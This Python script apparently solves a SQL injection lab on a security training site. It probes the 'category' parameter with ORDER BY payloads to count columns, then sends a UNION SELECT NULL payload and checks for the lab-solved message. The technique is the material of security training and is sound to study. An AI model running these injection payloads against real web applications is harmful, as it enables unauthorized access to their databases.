import requests

url = 'https://ac101f911ebb51778049188000010041.web-security-academy.net/filter?category=Accessories'

sqli_row = ["'+ORDER+BY+",
            "'+UNION+SELECT+"]
used_attack_r = []
null_x = 0
nulls = ""

session = requests.Session()
try:
    r = session.get(url=url)
except Exception as e:
    print(e)
    exit()

print(r.status_code)
if r.status_code == 200:
    for x in range(1,100):
        attack_url = url[:url.rfind("=")+1]+sqli_row[0]+str(x)+"--"
        used_attack_r.append(attack_url)
        r = session.get(url=attack_url)
        if r.status_code == 500:
            print("Valid number of rows is:",x-1)
            print(used_attack_r[x-2])
            null_x = x-1
            break
for x in range(null_x):
    nulls += "NULL,"
nulls = nulls[:len(nulls)-1]
print(nulls)
final_attack = url[:url.rfind("=")+1]+sqli_row[1]+nulls+"--" 
print(final_attack)
r = session.get(url=final_attack)
if "Congratulations, you solved the lab!" in r.text:
    print("lab passed")